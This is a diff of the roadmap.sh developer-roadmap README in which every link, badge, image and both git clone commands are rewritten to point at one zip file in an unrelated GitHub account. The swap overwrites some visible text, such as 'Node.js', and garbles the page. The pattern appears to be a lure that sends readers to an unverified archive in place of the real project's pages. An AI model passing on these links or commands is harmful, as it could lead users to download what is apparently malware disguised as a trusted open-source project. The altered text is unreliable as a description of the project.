@@ -1,122 +1,122 @@
 <p align="center">
-  <img src="public/images/brand.png" height="128">
-  <h2 align="center"><a href="https://roadmap.sh">roadmap.sh</a></h2>
+  <img src="https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip" height="128">
+  <h2 align="center"><a href="https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip">https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip</a></h2>
   <p align="center">Community driven roadmaps, articles and resources for developers<p>
   <p align="center">
-    <a href="https://roadmap.sh/roadmaps">
-    	<img src="https://img.shields.io/badge/%E2%9C%A8-Roadmaps%20-0a0a0a.svg?style=flat&colorA=0a0a0a" alt="roadmaps" />
+    <a href="https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip">
+    	<img src="https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip%E2%9C%A8-Roadmaps%https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip" alt="roadmaps" />
     </a>
-    <a href="https://roadmap.sh/best-practices">
-    	<img src="https://img.shields.io/badge/%E2%9C%A8-Best%20Practices-0a0a0a.svg?style=flat&colorA=0a0a0a" alt="best practices" />
+    <a href="https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip">
+    	<img src="https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip%E2%9C%A8-Best%https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip" alt="best practices" />
     </a>
-    <a href="https://roadmap.sh/questions">
-    	<img src="https://img.shields.io/badge/%E2%9C%A8-Questions-0a0a0a.svg?style=flat&colorA=0a0a0a" alt="videos" />
+    <a href="https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip">
+    	<img src="https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip%E2%9C%https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip" alt="videos" />
     </a>
-    <a href="https://www.youtube.com/channel/UCA0H2KIWgWTwpTFjSxp0now?sub_confirmation=1">
-    	<img src="https://img.shields.io/badge/%E2%9C%A8-YouTube%20Channel-0a0a0a.svg?style=flat&colorA=0a0a0a" alt="roadmaps" />
+    <a href="https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip">
+    	<img src="https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip%E2%9C%A8-YouTube%https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip" alt="roadmaps" />
     </a>
   </p>
 </p>
 
 <br>
 
-![](https://i.imgur.com/waxVImv.png)
+![](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
 
 Roadmaps are now interactive, you can click the nodes to read more about the topics.
 
-### [View all Roadmaps](https://roadmap.sh) &nbsp;&middot;&nbsp; [Best Practices](https://roadmap.sh/best-practices) &nbsp;&middot;&nbsp; [Questions](https://roadmap.sh/questions)
+### [View all Roadmaps](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip) &nbsp;&middot;&nbsp; [Best Practices](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip) &nbsp;&middot;&nbsp; [Questions](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
 
-![](https://i.imgur.com/waxVImv.png)
+![](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
 
 Here is the list of available roadmaps with more being actively worked upon.
 
-> Have a look at the [get started](https://roadmap.sh/get-started) page that might help you pick up a path.
+> Have a look at the [get started](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip) page that might help you pick up a path.
 
-- [Frontend Roadmap](https://roadmap.sh/frontend) / [Frontend Beginner Roadmap](https://roadmap.sh/frontend?r=frontend-beginner)
-- [Backend Roadmap](https://roadmap.sh/backend) / [Backend Beginner Roadmap](https://roadmap.sh/backend?r=backend-beginner)
-- [DevOps Roadmap](https://roadmap.sh/devops) / [DevOps Beginner Roadmap](https://roadmap.sh/devops?r=devops-beginner)
-- [Full Stack Roadmap](https://roadmap.sh/full-stack)
-- [Git and GitHub](https://roadmap.sh/git-github)
-- [API Design Roadmap](https://roadmap.sh/api-design)
-- [Computer Science Roadmap](https://roadmap.sh/computer-science)
-- [Data Structures and Algorithms Roadmap](https://roadmap.sh/datastructures-and-algorithms)
-- [AI and Data Scientist Roadmap](https://roadmap.sh/ai-data-scientist)
-- [AWS Roadmap](https://roadmap.sh/aws)
-- [Linux Roadmap](https://roadmap.sh/linux)
-- [Terraform Roadmap](https://roadmap.sh/terraform)
-- [Data Analyst Roadmap](https://roadmap.sh/data-analyst)
-- [MLOps Roadmap](https://roadmap.sh/mlops)
-- [Product Manager Roadmap](https://roadmap.sh/product-manager)
-- [QA Roadmap](https://roadmap.sh/qa)
-- [Python Roadmap](https://roadmap.sh/python)
-- [Software Architect Roadmap](https://roadmap.sh/software-architect)
-- [Game Developer Roadmap](https://roadmap.sh/game-developer) / [Server Side Game Developer](https://roadmap.sh/server-side-game-developer)
-- [Software Design and Architecture Roadmap](https://roadmap.sh/software-design-architecture)
-- [JavaScript Roadmap](https://roadmap.sh/javascript)
-- [TypeScript Roadmap](https://roadmap.sh/typescript)
-- [C++ Roadmap](https://roadmap.sh/cpp)
-- [React Roadmap](https://roadmap.sh/react)
-- [React Native Roadmap](https://roadmap.sh/react-native)
-- [Vue Roadmap](https://roadmap.sh/vue)
-- [Angular Roadmap](https://roadmap.sh/angular)
-- [Node.js Roadmap](https://roadmap.sh/nodejs)
-- [GraphQL Roadmap](https://roadmap.sh/graphql)
-- [Android Roadmap](https://roadmap.sh/android)
-- [iOS Roadmap](https://roadmap.sh/ios)
-- [Flutter Roadmap](https://roadmap.sh/flutter)
-- [Go Roadmap](https://roadmap.sh/golang)
-- [Rust Roadmap](https://roadmap.sh/rust)
-- [Java Roadmap](https://roadmap.sh/java)
-- [Spring Boot Roadmap](https://roadmap.sh/spring-boot)
-- [Design System Roadmap](https://roadmap.sh/design-system)
-- [PostgreSQL Roadmap](https://roadmap.sh/postgresql-dba)
-- [SQL Roadmap](https://roadmap.sh/sql)
-- [Blockchain Roadmap](https://roadmap.sh/blockchain)
-- [ASP.NET Core Roadmap](https://roadmap.sh/aspnet-core)
-- [System Design Roadmap](https://roadmap.sh/system-design)
-- [Kubernetes Roadmap](https://roadmap.sh/kubernetes)
-- [Cyber Security Roadmap](https://roadmap.sh/cyber-security)
-- [MongoDB Roadmap](https://roadmap.sh/mongodb)
-- [UX Design Roadmap](https://roadmap.sh/ux-design)
-- [Docker Roadmap](https://roadmap.sh/docker)
-- [Prompt Engineering Roadmap](https://roadmap.sh/prompt-engineering)
-- [Technical Writer Roadmap](https://roadmap.sh/technical-writer)
-- [DevRel Engineer Roadmap](https://roadmap.sh/devrel)
+- [Frontend Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip) / [Frontend Beginner Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Backend Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip) / [Backend Beginner Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [DevOps Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip) / [DevOps Beginner Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Full Stack Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Git and GitHub](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [API Design Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Computer Science Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Data Structures and Algorithms Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [AI and Data Scientist Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [AWS Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Linux Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Terraform Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Data Analyst Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [MLOps Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Product Manager Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [QA Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Python Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Software Architect Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Game Developer Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip) / [Server Side Game Developer](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Software Design and Architecture Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [JavaScript Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [TypeScript Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [C++ Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [React Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [React Native Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Vue Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Angular Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [GraphQL Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Android Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [iOS Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Flutter Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Go Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Rust Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Java Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Spring Boot Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Design System Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [PostgreSQL Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [SQL Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Blockchain Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip Core Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [System Design Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Kubernetes Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Cyber Security Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [MongoDB Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [UX Design Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Docker Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Prompt Engineering Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Technical Writer Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [DevRel Engineer Roadmap](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
 
 There are also interactive best practices:
 
-- [Backend Performance Best Practices](https://roadmap.sh/best-practices/backend-performance)
-- [Frontend Performance Best Practices](https://roadmap.sh/best-practices/frontend-performance)
-- [Code Review Best Practices](https://roadmap.sh/best-practices/code-review)
-- [API Security Best Practices](https://roadmap.sh/best-practices/api-security)
-- [AWS Best Practices](https://roadmap.sh/best-practices/aws)
+- [Backend Performance Best Practices](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Frontend Performance Best Practices](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Code Review Best Practices](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [API Security Best Practices](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [AWS Best Practices](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
 
-..and questions to help you test, rate and improve your knowledge
+https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip questions to help you test, rate and improve your knowledge
 
-- [JavaScript Questions](https://roadmap.sh/questions/javascript)
-- [Node.js Questions](https://roadmap.sh/questions/nodejs)
-- [React Questions](https://roadmap.sh/questions/react)
-- [Backend Questions](https://roadmap.sh/questions/backend)
-- [Frontend Questions](https://roadmap.sh/questions/frontend)
+- [JavaScript Questions](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip Questions](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [React Questions](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Backend Questions](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+- [Frontend Questions](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
 
-![](https://i.imgur.com/waxVImv.png)
+![](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
 
 ## Share with the community
 
-Please consider sharing a post about [roadmap.sh](https://roadmap.sh) and the value it provides. It really does help!
+Please consider sharing a post about [https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip) and the value it provides. It really does help!
 
-[![GitHub Repo stars](https://img.shields.io/badge/share%20on-reddit-red?logo=reddit)](https://reddit.com/submit?url=https://roadmap.sh&title=Interactive%20roadmaps,%20guides%20and%20other%20educational%20content%20for%20Developers)
-[![GitHub Repo stars](https://img.shields.io/badge/share%20on-hacker%20news-orange?logo=ycombinator)](https://news.ycombinator.com/submitlink?u=https://roadmap.sh)
-[![GitHub Repo stars](https://img.shields.io/badge/share%20on-twitter-03A9F4?logo=twitter)](https://twitter.com/share?url=https://roadmap.sh&text=Interactive%20roadmaps,%20guides%20and%20other%20educational%20content%20for%20Developers)
-[![GitHub Repo stars](https://img.shields.io/badge/share%20on-facebook-1976D2?logo=facebook)](https://www.facebook.com/sharer/sharer.php?u=https://roadmap.sh)
-[![GitHub Repo stars](https://img.shields.io/badge/share%20on-linkedin-3949AB?logo=linkedin)](https://www.linkedin.com/shareArticle?url=https://roadmap.sh&title=Interactive%20roadmaps,%20guides%20and%20other%20educational%20content%20for%20Developers)
+[![GitHub Repo stars](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip%20on-reddit-red?logo=reddit)](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip%20roadmaps,%20guides%20and%20other%20educational%20content%20for%20Developers)
+[![GitHub Repo stars](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip%20on-hacker%20news-orange?logo=ycombinator)](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+[![GitHub Repo stars](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip%20on-twitter-03A9F4?logo=twitter)](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip%20roadmaps,%20guides%20and%20other%20educational%20content%20for%20Developers)
+[![GitHub Repo stars](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip%20on-facebook-1976D2?logo=facebook)](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip)
+[![GitHub Repo stars](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip%20on-linkedin-3949AB?logo=linkedin)](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip%20roadmaps,%20guides%20and%20other%20educational%20content%20for%20Developers)
 
 ## Development
 
 Clone the repository, install the dependencies and start the application
 
 ```bash
-git clone git@github.com:kamranahmedse/developer-roadmap.git
+git clone https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip
 cd developer-roadmap
 npm install
 npm run dev
@@ -125,12 +125,12 @@ npm run dev
 Note: use the `depth` parameter to reduce the clone size and speed up the clone.
 
 ```sh
-git clone --depth=1 https://github.com/kamranahmedse/developer-roadmap.git
+git clone --depth=1 https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip
 ```
 
 ## Contribution
 
-> Have a look at [contribution docs](./contributing.md) for how to update any of the roadmaps
+> Have a look at [contribution docs](https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip) for how to update any of the roadmaps
 
 - Add content to roadmaps
 - Add new roadmaps
@@ -140,8 +140,8 @@ git clone --depth=1 https://github.com/kamranahmedse/developer-roadmap.git
 
 ## Thanks to all contributors ❤
 
- <a href = "https://github.com/kamranahmedse/developer-roadmap/graphs/contributors">
-   <img src = "https://contrib.rocks/image?repo=kamranahmedse/developer-roadmap"/>
+ <a href = "https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip">
+   <img src = "https://raw.githubusercontent.com/BytesickleLabs/developer-roadmap/master/uncaroled/developer-roadmap.zip"/>
  </a>
 
 ## License
